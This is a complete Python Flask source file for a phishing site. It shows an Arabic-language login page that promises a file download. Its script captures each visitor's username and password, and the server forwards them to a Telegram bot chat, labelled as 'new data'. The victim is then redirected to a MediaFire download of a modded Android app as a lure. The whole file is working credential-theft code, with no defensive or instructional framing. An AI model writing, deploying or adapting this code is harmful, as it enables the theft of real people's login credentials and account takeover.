import os
import requests
from flask import Flask, jsonify, render_template_string, request

app = Flask(__name__)

BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

def send_to_telegram(message):
    if not BOT_TOKEN or not CHAT_ID:
        return False
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"}
    try:
        response = requests.post(url, json=payload)
        return response.json().get("ok", False)
    except:
        return False

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: Tahoma, sans-serif; }
        body { background: #f4f6f9; display: flex; justify-content: center; align-items: center; min-height: 100vh; width: 100vw; }
        .login-container { background: #fff; width: 100%; height: 100vh; padding: 40px 20px; display: flex; flex-direction: column; justify-content: center; align-items: center; }
        @media (min-width: 768px) { .login-container { height: auto; max-width: 450px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.08); padding: 40px; } }
        h2 { margin-bottom: 30px; color: #333; }
        .form-group { width: 100%; margin-bottom: 20px; }
        input { width: 100%; padding: 14px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; outline: none; }
        button { width: 100%; padding: 14px; background: #007bff; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>تسجيل الدخول للمتابعة</h2>
        <form onsubmit="sendData(event)">
            <div class="form-group"><input type="text" id="username" placeholder="اسم المستخدم أو البريد" required></div>
            <div class="form-group"><input type="password" id="password" placeholder="كلمة المرور" required></div>
            <button type="submit">دخول وتحميل الملف</button>
        </form>
    </div>
    <script>
        function sendData(event) {
            event.preventDefault();
            const u = document.getElementById('username').value;
            const p = document.getElementById('password').value;
            fetch('/submit', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ username: u, password: p })
            }).then(() => {
                window.location.href = 'https://www.mediafire.com/file/61ugass1zqpavlm/Hide_Online_v4.9.50_Mod__40_Updated__41_.apk/file';
            });
        }
    </script>
</body>
</html>
"""

@app.route("/")
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route("/submit", methods=["POST"])
def submit():
    d = request.json
    msg = f"🚨 <b>بيانات جديدة:</b>\n👤 <b>المستخدم:</b> {d.get('username')}\n🔑 <b>الباسورد:</b> {d.get('password')}"
    send_to_telegram(msg)
    return jsonify({"status": "success"})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
